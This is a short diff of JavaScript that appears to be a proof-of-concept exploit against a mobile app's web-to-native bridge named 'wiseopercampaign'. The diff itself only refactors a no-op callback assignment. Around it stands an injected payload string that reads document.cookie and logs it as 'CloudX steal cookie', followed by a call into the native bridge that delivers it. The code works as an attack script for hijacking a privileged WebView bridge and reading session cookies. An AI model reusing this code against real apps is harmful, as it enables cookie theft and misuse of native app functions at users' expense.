@@ -26,7 +26,8 @@
 
         const payload = `console.log('cloud:'+document.cookie);
         
-        window['wiseopercampaign'].callbackFromNative = () => {};
+        const callbackFromNative = ()=>{};
+        window['wiseopercampaign'].callbackFromNative =callbackFromNative;
         
         if (!location.href.startsWith('https://h5hosting-drcn.dbankcdn.cn') && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}`;
 
@@ -81,9 +82,8 @@
         } : null;
         callNativeMethod(bridgeName, wrapSuccess, wrapFail, service, action, args);
     };
-
-    window['wiseopercampaign'].callbackFromNative = () => {
-    };
+    const callbackFromNative = ()=>{};
+    window['wiseopercampaign'].callbackFromNative =callbackFromNative;
     window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
         "wiseopercampaignbridge",
